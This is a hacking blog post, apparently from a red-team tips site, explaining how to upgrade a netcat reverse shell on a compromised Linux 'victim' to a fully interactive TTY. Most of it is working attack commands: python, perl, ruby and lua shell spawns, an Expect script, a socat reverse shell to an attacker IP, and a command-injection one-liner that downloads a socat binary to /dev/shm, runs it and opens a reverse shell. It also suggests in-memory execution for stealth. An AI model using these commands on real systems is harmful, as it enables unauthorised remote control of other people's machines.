---
description: >-
  How to upgrade a linux reverse shell to a fully usable TTY shell
title: Upgrade a linux reverse shell to a fully usable TTY shell                    # Add title of the machine here
date: 2021-04-29 08:00:00 -0600                           # Change the date to match completion date
categories: [Tips & Tricks]                     # Categories
tags: [hacking, redteam, tips-n-tricks, socat, expect, python, linux, macos]     # TAG names should always be lowercase; add relevant tags
show_image_post: true                                    # Change this to true
#image: /assets/img/                # Add image here for post preview image
---

![Hack responsibly disclaimer](/assets/markups/1-hack-responsibly.svg)

## Upgrading remote shells (Unix machines only)

Usually, after catching a shell through netcat you are placed in a shell that has very limited functionality. The features I miss the most are command history (and using the 'up' and 'down' arrows to cycle through them) and tab autocompletion.  It can feel quite disorienting working in a shell that is missing these vital features.  

 **Note:** To check if the shell is a TTY shell use the `tty` command.

 ## rlwrap
 
You can also mitigate some of the restrictions of poor netcat shells by wrapping the netcat listener with the `rlwrap` command.  This is not installed by default so you will need to install it using `sudo apt rlwrap`.

```bash
rlwrap nc -lvnp $port
```

If the remote machine has Python installed you can easily upgrade to a fully functional TTY shell.

## Upgrade to fully interactive shell using Python:

1. First, after recieving your reverse shell you need to check the availability of Python. You can do this with the `which` command.

```bash
which python python2 python3
```

If any of these are installed this command will return the full path of the installed binary.  

Note: The `which` command will only report programs that are installed in a folder that exists in `$PATH`.  Python will almost always be in a `$PATH` directory so this should not be an issue.

2. Next, on the victim machine type the below command (using the version of python that is available on the machine!)

```bash
python -c 'import pty;pty.spawn("/bin/bash")'; #spawn a python psuedo-shell
```

Your command prompt may or may not change to reflect the new shell.  If it does not change, do not panic as this is configured locally and will depend on setting on the machine you are on.

3. Next, type `ctrl-z` to send your shell to the background.

4. On your attack platform, you will need to set up your shell to send control charcters and other raw input through the reverse shell.  You can do this by using the `stty` command as below.

```bash
stty raw -echo
stty size 
```

The second command above will report the size of your terminal window in rows and columns.  This is useful for command output that either fills the whole terminal (such as when using programs such as `nano` or `vim`) or that would output lines that are too long to fit in the window.  Fixing the window size will allow for word-wrapping instead of cutting off output that is too long.

5. After that, type the command `fg` to return the reverse shell to the foreground.

6. Next, on the victim machine type the below commands to set some important environment variables.

```bash
export SHELL=bash
stty rows $x columns $y #Set remote shell to x number of rows & y columns
export TERM=xterm-256color #allows you to clear console, and have color output
```

Viola!  You should now be the proud owner of a shiny new fully upgraded TTY shell with command history using the 'up' and 'down' arrows.  This shell will also allow you to use the command `clear` to clear your screen and 'control' commands, such as `ctrl-c` to kill remotely running processes rather than your own shell! Enjoy!


## Using Other Scripting Languages:

Below are some examples of other scripting languages that can be used to achieve the same upgraded shell as the second step above.  Afterwards follow along from step 3.

```python
echo os.system('/bin/bash')
/bin/sh -i

#python3
python3 -c 'import pty; pty.spawn("/bin/sh")'

#perl
perl -e 'exec "/bin/sh";'

#ruby
exec "/bin/sh"
ruby -e 'exec "/bin/sh"'

#lua
lua -e "os.execute('/bin/sh')"
```

## Using “Expect” To Get A TTY

If you’re lucky enough to have the [Expect](http://en.wikipedia.org/wiki/Expect) language installed just a few lines of code will get you a good enough TTY to run useful tools such as “ssh”, “su” and “login”.

Create a script called `sh.exp`

```bash
#!/usr/bin/expect
# Spawn a shell, then allow the user to interact with it.
# The new shell will have a good enough TTY to run tools like ssh, su and login
spawn sh
interact
```

Then, execute this script on the victim machine.  For added sneakiness, run the script [from memory](https://zweilosec.github.io/posts/execute-in-memory/).

## Using socat

Another option is to upload the binary for `socat` to the victim machine and magically get a fully interactive shell. Download the appropriate binaries from [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries). Socat needs to be on both machines for this to work.

```bash
#Create Listener on attack platform:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#From Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.15.100:4444
```

## socat one-liner

This one-liner can be injected wherever you can get command injection for an instant fully interactive reverse shell. Point the path to the binary to your local http server if internet access is limited on the victim.

```bash
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /dev/shm/socat; chmod +x /dev/shm/socat; /dev/shm/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.15.100:4444
```

### Disclaimer

Note: The methods above will not work in every situation.  For example, I have regularly run into a problem on my Kali machine where attempting to use `stty raw -echo` while using `zsh` as my shell will cause the entire terminal to become unusable.  I have gotten around this issue by switching to `bash` before I start any netcat listener that I will be using to catch a shell.

## Other Examples

If you have any other examples of methods of upgrading reverse shells, or have any other fun or useful tips or tricks, feel free to contact me on Github at [https://github.com/zweilosec](https://github.com/zweilosec) or in the comments below!

If you like this content and would like to see more, please consider buying me a coffee! <a href="https://www.buymeacoffee.com/zweilosec"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee&emoji=&slug=zweilosec&button_colour=FFDD00&font_colour=000000&font_family=Lato&outline_colour=000000&coffee_colour=ffffff"></a>

